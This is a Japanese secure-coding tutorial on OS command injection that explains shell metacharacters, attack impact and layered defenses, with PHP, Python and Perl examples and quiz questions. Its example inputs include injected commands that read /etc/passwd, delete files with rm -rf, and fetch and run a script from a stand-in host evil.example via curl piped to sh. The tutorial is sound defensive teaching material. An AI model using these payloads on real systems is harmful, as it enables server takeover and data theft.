    20 インジェクション

    OSコマンドインジェクション

    Webアプリは、画像変換・バックアップ・外部ツール連携などで OS のコマンドを呼び出すことがあります。そのときに起きやすいのが OSコマンド・インジェクションです。外部からの入力がサーバーへの命令として実行されてしまう仕組みと被害、そして「そもそもコマンドを呼ばない」から「最小権限で動かす」までの対策を、優先度の高い順に解説します（徳丸本 第14章）。

    もとにしたノート：20_インジェクション/05_OSコマンド呼び出しの際に発生する脆弱性（徳丸本14章）

    ひとことで言うと

    入力値を 1本のコマンド文字列に連結してシェルに渡す と、; や | などの記号で 攻撃者の命令を追加 されてしまいます。いちばんの対策は OS コマンドを呼ばない こと、次に シェルを介さずコマンドと引数を分けて渡す ことです。

    1.OSコマンド・インジェクションの概要

    OSコマンド・インジェクション（OS Command Injection） とは、外部から渡された文字列をそのまま OS のコマンドとして実行してしまい、攻撃者が意図した別のコマンドまで動かされてしまう 脆弱性です。OS コマンド とは、ping・cp・convert など、サーバーの OS 上で動くプログラムをコマンドラインから起動する命令のことです。

    SQLインジェクション が「データベースへの命令」を注入するのに対し、こちらは 「OS（サーバー本体）への命令」 を注入する攻撃です。影響範囲がサーバー全体に及ぶため、非常に危険です。インジェクション全般の考え方は インジェクションと暗号化の不備 も参照してください。

    項目内容
    分類インジェクション系脆弱性
    インターフェースOS のシェル（コマンドライン）
    悪用手口シェルのメタ文字などを混ぜて、別コマンドを実行させる

    1.1 日常生活での例え

    正常なコマンド実行

    「この画像をリサイズして」と頼むと、その作業だけ が行われる。

    攻撃された場合

    「この画像をリサイズして。ついでに金庫の鍵も開けて」と書かれ、頼んでいない作業まで実行される。

    1.2 なぜ危険か

    Webアプリが OS コマンドを実行できるということは、サーバー上でプログラムを動かす権限 を持っているということです。その権限が乗っ取られると、次のような被害が出ます。

    ・攻撃用ツールを外部からダウンロードされる
・ダウンロードしたツールに実行権限を与えられる
・OSの脆弱性を内部から攻撃され、管理者権限を奪われる
・Webサーバーが攻撃者の思いのままになる

    一度サーバーを乗っ取られると、Webアプリの範囲を超えて、OS 全体が危険にさらされます。

    2.OSコマンド・インジェクションとは

    2.1 シェルとメタ文字（攻撃を読むために）

    OS コマンドは、多くの場合 シェル（bash や cmd.exe など）経由で実行されます。シェルとは、人が打ち込んだコマンド文字列を読み取って解釈し、プログラムを起動する「通訳」役のプログラムです。シェルは、特別な意味を持つ文字（メタ文字）を解釈します。

    メタ文字（例）意味
    ;コマンドの区切り（前のコマンドのあとに別コマンドを実行）
    |パイプ（前の結果を次のコマンドへ渡す）
    & / &&バックグラウンド実行 / 前が成功したら次を実行
    ` や $()コマンド置換（中のコマンドを実行して結果を埋め込む）
    > / >>出力のリダイレクト（ファイルへ書き込み）
    改行コマンドの区切りとして扱われることがある

    これらの文字が エスケープ（無害化）されずに コマンド文字列に入ると、攻撃者は「本来のコマンド」のあとに 自分のコマンドを追加 できます。エスケープとは、特別な意味を持つ文字を「ただの文字」として扱われる形に変換することです。

    2.2 攻撃のイメージ

    たとえば、ホスト名の疎通確認（ping：相手のサーバーに届くかを確かめるコマンド）を行う機能が次のような URL だとします。

    https://example.com/ping.php?host=example.com

    アプリが host パラメータをそのままコマンドに連結している場合：

    【正常な入力】
host=example.com
→ ping example.com を実行（想定どおり）

【攻撃者の入力】
host=example.com; cat /etc/passwd
→ ping example.com; cat /etc/passwd を実行
→ ping のあとに、パスワード関連ファイルの内容表示まで実行される

    ; は「ここでコマンドを区切る」という意味です。そのため、本来の ping のあとに、攻撃者が指定した別コマンドが動きます。cat はファイルの中身を表示するコマンド、/etc/passwd は Linux のユーザー一覧が書かれたファイルです。

    【別の攻撃例】
host=example.com && curl http://evil.example/malware.sh | sh
→ 外部から攻撃用スクリプトをダウンロードして実行する

    curl は URL の内容を取得するコマンドです。取得したスクリプトを |（パイプ）で sh（シェル）に渡し、そのまま実行させています。

    2.3 攻撃の流れ

    1. 攻撃者が「外部入力を OS コマンドに渡す」機能を見つける
    2. ; や | などのメタ文字を含む値を送る
    3. アプリが入力値をそのままコマンド文字列に連結する
    4. シェルがメタ文字を解釈し、追加コマンドを実行する
    5. ファイル閲覧・改ざん、外部通信、権限昇格などが起きる

    3.何ができるか（被害）

    OSコマンド・インジェクションが成功すると、Webアプリが動いているユーザー権限の範囲で、ほぼ何でもできます。

    3.1 サーバー乗っ取りまでの典型的な流れ

    攻撃者は、いきなり管理者になるのではなく、段階的に権限を広げていくことが多いです。一般ユーザーの権限から管理者の権限へ広げることを 権限昇格 といいます。

    段階攻撃者がやること目的
    1攻撃用ツールを外部からダウンロード侵入後に使う道具を用意する
    2ダウンロードしたツールに実行権限を与えるツールを動かせるようにする
    3OS の脆弱性を内部から攻撃する一般ユーザーから管理者権限へ昇格する
    4Webサーバーを完全に掌握する好きな操作をいつでもできるようにする
     
    【イメージ】

外部入力
  ↓
OSコマンド・インジェクション成功
  ↓
Webアプリの権限でコマンド実行できる
  ↓
攻撃ツールのダウンロード・実行
  ↓
OSの脆弱性を突いて管理者権限を取得
  ↓
サーバー全体が攻撃者の思いのまま

    3.2 具体的な被害例

    被害説明
    Webサーバー内のファイルの閲覧・改ざん・削除設定ファイル、ソースコード、個人情報の漏洩や改ざん。サイトの破壊も可能
    外部へのメールの送信迷惑メールやなりすましメールの踏み台にされる
    別のサーバーへの攻撃社内ネットワークや他サイトへの攻撃の起点（踏み台）になる
    暗号通貨の採掘サーバーの CPU / GPU を勝手に使われ、電気代や性能低下の被害が出る

    踏み台 とは、攻撃者が自分の正体を隠すために、乗っ取ったサーバーを経由して別の相手を攻撃することです。ファイルを読まれるだけでも危険ですが、書き込みや外部通信までできると、自社サーバーが攻撃の拠点 になります。被害は自社サイトにとどまりません。

    4.脆弱性が生まれる原因

    次の条件がそろうと、OSコマンド・インジェクションが起きやすくなります。

    原因説明
    シェルのメタ文字がエスケープされていない; | & などがそのままコマンド文字列に入り、シェルに解釈される
    シェル機能を呼び出せる関数を使っているシェル経由でコマンドを実行する API を使っている

    4.1 原因1：シェルのメタ文字がエスケープされていない

    外部入力をコマンド文字列に連結するとき、メタ文字を無害化していないと、入力が「データ」ではなく「命令」として扱われます。

    ✕ 危険：外部入力をそのままコマンドに連結

    // ❌ 危険: 外部入力をそのままコマンドに連結
$host = $_GET['host'];
system("ping -c 1 " . $host);
    入力: example.com; rm -rf /tmp/important
実行されるコマンド:
  ping -c 1 example.com; rm -rf /tmp/important

    example.com はデータとして渡したつもりでも、; 以降は別コマンドとして実行されます。rm -rf はファイルやフォルダを確認なしで丸ごと削除するコマンドです。

    4.2 原因2：シェル機能を呼び出せる関数を使っている

    言語には、シェル経由でコマンドを実行する関数 と、シェルを介さず直接プログラムを起動する関数 があります。前者を使うと、メタ文字が解釈されやすく危険です。

    言語シェル経由になりやすい例比較的安全な方向性
    PHPsystem(), exec(), shell_exec(), passthru(), バッククォートproc_open() で引数を配列渡し、など
    Perlsystem("cmd $input")、open(PIPE, "| cmd $input")system(@args)、sysopen、リスト形式の呼び出し
    Pythonos.system(), subprocess の shell=Truesubprocess.run([...], shell=False)
    Ruby`cmd`、system("cmd #{input}")system("cmd", arg1, arg2) のように引数分離

    ポイントは、「1本の文字列としてシェルに渡す」か「コマンドと引数を分けて渡す」か です。文字列で渡すとシェルがメタ文字を解釈します。

    ❌ 危険（シェルが解釈する）
  "ping -c 1 " + userInput
  → シェルが ; や | を命令として扱う

✅ 安全寄り（引数として渡す）
  ["ping", "-c", "1", userInput]
  → userInput は「ただの文字列」として扱われやすい

    5.OSコマンド・インジェクションの対策

    対策は、優先度の高いものから順に考えます。

    【対策の優先順位】

1. OSコマンド呼び出し自体を使わない
2. シェル経由の関数を使わない
3. 外部入力をコマンドのパラメータに渡さない
4. どうしても渡すなら、安全な方法でエスケープ / 検証する
5. 被害を抑える（権限最小化・パッチ適用）

    最も安全なのは 「そもそも OS コマンドを呼ばない」 ことです。エスケープは最後の手段に近い位置づけです。

    5.1 OSコマンド呼び出しを使わない実装方法を選択する

    同じ機能でも、OS コマンドを使わずに実現できることがよくあります。

    やりたいことOSコマンドに頼りがちな例コマンドを使わない例
    画像のリサイズconvert（ImageMagick）を system で呼ぶ画像処理ライブラリ（GD、Imagick 拡張など）を API として使う
    PDF の生成外部コマンドで変換言語用の PDF ライブラリを使う
    ファイル操作rm cp cat を実行言語標準のファイル API を使う
    疎通確認ping を実行そもそもユーザー向けに公開しない / 専用ライブラリを使う

    ✕ 危険：OS コマンドでファイルを読む

    // ❌ 危険: OS コマンドでファイルを読む
system("cat " . $filename);

    ○ 良い例：言語のファイル API を使う

    // ✅ 良い例: 言語のファイル API を使う
$content = file_get_contents($filename);

    ライブラリや言語標準機能で足りるなら、OS コマンド呼び出しは避ける のが第一選択です。

    補足：ファイル名の扱いは別の問題が残ります

    file_get_contents() にすれば OS コマンドは動きませんが、$filename が外部入力なら ../ などで想定外のファイルを読まれる危険（ディレクトリ・トラバーサル）は残ります。ファイル名を外部から受け取る場合の注意は ファイルインクルード も参照してください。

    5.2 シェル呼び出し機能のある関数の利用を避ける

    どうしても外部プログラムを起動する場合は、シェルを介さない呼び出し方 を選びます。

    PHP の例

    // ❌ 危険: シェル経由（メタ文字が解釈される）
$host = $_GET['host'];
system("ping -c 1 " . $host);

// ✅ 良い例の方向性: 引数を分離して渡す（シェルを介さない）
// PHP では proc_open などで引数配列を渡す方法がある
$cmd = ['ping', '-c', '1', $host];
// $host は「ping の引数」として扱われ、; はただの文字になる

    補足：proc_open に配列を渡す書き方

    PHP 7.4 以降では、proc_open() の第1引数に配列を渡すと、シェルを介さずに直接プログラムを起動します。

    $proc = proc_open($cmd, [1 => ['pipe', 'w']], $pipes);

    Python の例

    # ❌ 危険
os.system("ping -c 1 " + host)
subprocess.run("ping -c 1 " + host, shell=True)

# ✅ 良い例: shell=False（デフォルト）でリスト渡し
subprocess.run(["ping", "-c", "1", host], shell=False)

    シェルを介さない場合、; や | は「コマンドの区切り」ではなく、ファイル名やホスト名の一部というただの文字 として渡されます（上の図の下段）。

    Perl の場合：open の代わりに sysopen を使う

    Perl では、open の使い方によってシェルが起動することがあります。ファイルを開くだけなら、sysopen や モードを明示した open を使います。

    ✕ 危険になりやすい例

    # ❌ 危険になりやすい: ファイル名にメタ文字が含まれるとシェルが動くことがある
open(my $fh, $filename);

    ○ 良い例

    # ✅ 良い例: sysopen でファイルを開く（シェルを介さない）
use Fcntl qw(O_RDONLY);
sysopen(my $fh, $filename, O_RDONLY) or die $!;

# ✅ 良い例: open でもモードを明示する（3引数形式）
open(my $fh, '<', $filename) or die $!;
    書き方安全性説明
    open(FH, $filename)危険になりやすいファイル名の内容次第でパイプやシェルが動くことがある
    open(FH, '<', $filename)安全寄り読み取りモードを明示し、ファイルとして開く
    sysopen安全寄り低レベルなファイルオープン。シェルを介さない

    たとえば2引数の open では、ファイル名が | cmd で始まったり cmd | で終わったりすると、ファイルではなくコマンドとして起動されます。「ファイルを開きたいだけなのに、気づかないうちにコマンド実行できてしまう」のが典型的な落とし穴です。意図がファイルオープンなら、コマンド実行経路のない API を使う のがポイントです。

    5.3 外部から入力された文字列をコマンドラインのパラメータに渡さない

    シェルを介さない呼び出しでも、外部入力をコマンドの引数に渡すと、別の問題が起きることがあります（想定外のオプション指定など）。たとえば入力が - で始まると、コマンドはそれを「データ」ではなく オプション（動作を切り替える指定） として受け取ってしまいます。

    最も安全なのは、外部入力をコマンドラインに一切渡さない ことです。

    ❌ 悪い例
  /convert.php?file=user_upload.png
  → ユーザーが指定したファイル名をそのままコマンド引数にする

✅ 良い例
  /convert.php?id=123
  → ID だけ受け取り、サーバー側で実ファイルパスや処理内容を決める
    方針説明
    ID で管理するDB に「ID ↔ 実データ」を持ち、外部には ID だけ渡す
    サーバー側で固定する実行するコマンドや引数をアプリが決め打ちする
    許可リスト（ホワイトリスト）「small」「large」など、決まった値だけ受け付ける

    ○ 良い例：外部入力は ID のみ

    // ✅ 良い例: 外部入力は ID のみ。コマンド引数はサーバー側で決める
$id = (int)($_GET['id'] ?? 0);

// DB から許可されたファイルパスを取得（ユーザー入力そのものではない）
$path = findAllowedPathById($id);
if ($path === null) {
    exit('不正な指定です');
}

// どうしても外部コマンドが必要なら、サーバーが決めたパスだけ渡す
// ※ 可能ならライブラリ利用に置き換える

    (int) は値を整数に変換する書き方で、数字以外の文字はここで取り除かれます。findAllowedPathById() は「ID から許可済みのパスを探す」ための架空の関数です。

    5.4 OSコマンドに渡すパラメータを安全な関数によりエスケープする

    やむを得ず外部入力をコマンドに渡す場合は、その言語・環境向けの安全なエスケープ関数 を使います。自分で ; を消すだけ、といった独自処理は漏れやすく危険です。

    言語エスケープの例
    PHPescapeshellarg()（引数用）、escapeshellcmd()（コマンド用 ※用途に注意）
    PerlString::ShellQuote など
    Pythonそもそも shell=False ＋ リスト渡しを優先。文字列結合しない

    どうしてもシェル経由が必要な場合（最終手段）

    // どうしてもシェル経由が必要な場合の例（最終手段）
$host = $_GET['host'] ?? '';

// 引数として安全にクォートする
$safeHost = escapeshellarg($host);
system("ping -c 1 " . $safeHost);

    escapeshellarg() は値全体をシングルクォート '…' で囲み、シェルに「ひとかたまりの文字列」として渡す関数です（クォート＝引用符で囲むこと）。一方 escapeshellcmd() はコマンド文字列全体のメタ文字をエスケープするもので、引数1つずつの無害化には向きません。引数には escapeshellarg() を使います。

    ただし、エスケープは ミスや関数の誤用が起きやすい です。可能なら「コマンドを使わない」「シェルを介さない」「外部入力を渡さない」を優先してください。

    パラメータをシェルの環境変数経由で渡す

    別の安全寄りの方法として、値をコマンドライン引数ではなく環境変数で渡し、スクリプト側で参照する やり方があります。環境変数 とは、起動するプログラムに「名前＝値」の形で受け渡せる設定値のことです。

    【考え方】

❌ コマンドラインに直接埋め込む
  system("process.sh " . $userInput);
  → メタ文字がコマンド文字列に混ざる

✅ 環境変数経由で渡す
  環境変数 VALUE=$userInput を設定
  system("process.sh");  ※ 引数にはユーザー入力を付けない
  process.sh の中で $VALUE を参照

    コマンドライン文字列にユーザー入力が現れないため、シェルのメタ文字解釈を避けやすくなります。ただし、呼び出し方やスクリプト側の扱いを誤ると別の問題になるため、「引数を分離して渡す」「そもそもコマンドを使わない」 の方が分かりやすく安全です。

    5.5 パラメータの検証

    エスケープとあわせて、受け付ける値の形式を厳しく制限 します。

    ○ ホスト名として許される文字だけ通す（例）

    // ✅ ホスト名として許される文字だけ通す（例）
$host = $_GET['host'] ?? '';

if (!preg_match('/\A[a-zA-Z0-9.-]+\z/', $host)) {
    exit('不正なホスト名です');
}

// 長さ制限もあるとよい
if (strlen($host) > 253) {
    exit('不正なホスト名です');
}

    preg_match は正規表現（文字のパターン）に一致するかを調べる関数で、\A と \z は「文字列の先頭」と「文字列の末尾」を表します。途中に1文字でも許可外の文字があれば拒否されます。

    補足：先頭のハイフンにも注意

    この正規表現は - を許可しているため、-f のような 先頭がハイフンの値 も通ってしまいます。これは ping にオプションとして解釈されるおそれがあります（5.3 の「想定外のオプション指定」）。先頭を英数字に限定する（例：/\A[a-zA-Z0-9][a-zA-Z0-9.-]*\z/）か、対応するコマンドなら引数の前に --（「ここから先はオプションではない」という印）を置くと安全です。

    検証の例効果
    英数字と一部記号だけ許可; | & などをそもそも受け付けない
    長さ制限異常に長い入力を拒否する
    許可リスト決まった選択肢以外を拒否する

    許可リスト（「A か B か C だけ」）が使えるなら、それが最も分かりやすく安全です。

    5.6 被害を抑える対策（多層防御）

    インジェクション自体を防ぐのが本筋ですが、万一突破されたときの被害を小さくする対策も重要です。複数の守りを重ねる考え方（多層防御）は 深層防御 で詳しく扱っています。

    アプリケーションの稼働するユーザー権限を最小限にする

    Webアプリは、必要最小限の権限の OS ユーザー で動かします（考え方は 最小権限とデータ最小化 を参照）。

    ❌ 悪い例
  root（管理者）権限で Web アプリを動かす
  → 侵入された瞬間にサーバー全体を掌握される

✅ 良い例
  専用の低権限ユーザー（例: www-data）で動かす
  → できる操作が限られ、被害が広がりにくい

    root は Linux の管理者ユーザー、www-data は Web サーバー用によく使われる低権限ユーザーの名前です。

    方針説明
    管理者権限で動かさないroot / Administrator での常時稼働を避ける
    書き込み先を限定するアプリが触れるディレクトリを最小にする
    不要なコマンドを使えないようにするOS 側の権限や実行ファイルの制限

    権限が低いと、「管理者権限の奪取」までには追加の攻撃が必要になり、防御の時間を稼げます。

    Webサーバーの OS やミドルウェアのパッチ適用

    攻撃者は、侵入後に OS やミドルウェアの既知の脆弱性 を使って権限昇格することがあります。ミドルウェア は Web サーバーや言語ランタイムなど OS とアプリの間で動くソフトウェア、パッチ は脆弱性を修正する更新プログラムです。パッチを当てておくと、その道を塞げます。

    対象なぜ必要か
    OSカーネルや標準コマンドの脆弱性を塞ぐ
    WebサーバーApache / Nginx などの既知の穴を塞ぐ
    言語ランタイムPHP / Python / Perl などの更新
    ライブラリ・外部ツールImageMagick など、コマンド連携で使いがちな部品
     
    【多層防御のイメージ】

第1層: OSコマンドを使わない / シェルを介さない / 入力を渡さない
第2層: エスケープとパラメータ検証
第3層: 最小権限でアプリを動かす
第4層: OS・ミドルウェアのパッチ適用

    どれか1つだけでは不十分です。侵入しにくくする対策 と 侵入されても被害を抑える対策 の両方を積みます。

    6.まとめ

    項目要点
    何が起きるか外部入力が OS コマンドとして実行され、サーバーを乗っ取られる
    主な被害ファイルの閲覧・改ざん・削除、迷惑メール、他サーバーへの攻撃、暗号通貨採掘
    原因シェルのメタ文字がエスケープされていない / シェル経由の関数を使っている
    最良の対策OSコマンド呼び出し自体を使わない
    次善の対策シェルを介さない / 外部入力をコマンドに渡さない
    やむを得ない場合安全なエスケープ関数・環境変数経由・許可リスト検証
    被害軽減最小権限での稼働、OS・ミドルウェアのパッチ適用

    OSコマンド呼び出し安全の基本

    1. できるなら OS コマンドを呼ばない（ライブラリや言語標準機能を使う）
    2. 呼ぶならシェルを介さない（コマンドと引数を分離する）
    3. 外部入力をコマンドラインに渡さない（ID 管理・許可リスト）
    4. どうしても渡すなら、安全な関数でエスケープし、形式を厳しく検証する
    5. アプリは最小権限で動かし、OS やミドルウェアは最新に保つ

    7.理解度チェック

    Q1. system("ping -c 1 " . $host) に example.com; cat /etc/passwd を渡すと、何が起きますか？

    シェルが ; をコマンドの区切りと解釈するため、ping -c 1 example.com のあとに cat /etc/passwd も実行され、ユーザー一覧ファイルの中身が表示されます。

    Q2. 脆弱性が生まれる2つの原因は何ですか？

    ① シェルのメタ文字（; | & など）がエスケープされていないこと、② シェル経由でコマンドを実行する関数（PHP の system()、Python の shell=True など）を使っていることです。

    Q3. subprocess.run(["ping", "-c", "1", host]) の形が安全寄りなのはなぜですか？

    シェルを介さず、コマンドと引数を分けて直接プログラムを起動するからです。host に ; や | が含まれていても、区切りではなく1つの引数の中の「ただの文字」として渡されます。

    Q4. 対策の中で最も優先度が高いものは何ですか？ エスケープはどの位置づけですか？

    最優先は OS コマンド呼び出し自体を使わない（ライブラリや言語標準機能で代替する）ことです。エスケープはミスや誤用が起きやすいため、「シェルを介さない」「外部入力を渡さない」が使えない場合の最後の手段に近い位置づけです。

    Q5. Perl で open(my $fh, $filename) が危険になりやすいのはなぜですか？ どう書き換えますか？

    2引数の open は、ファイル名の内容次第でパイプやシェルを起動してしまうことがあるからです。sysopen(my $fh, $filename, O_RDONLY) か、モードを明示した3引数形式 open(my $fh, '<', $filename) を使います。

    Q6. インジェクションを防げていれば、アプリを root で動かしても問題ありませんか？

    問題があります。万一突破されたときに、root ならサーバー全体を即座に掌握されます。専用の低権限ユーザーで動かし、OS・ミドルウェアのパッチも当てて、侵入されても被害を抑える層を重ねます。
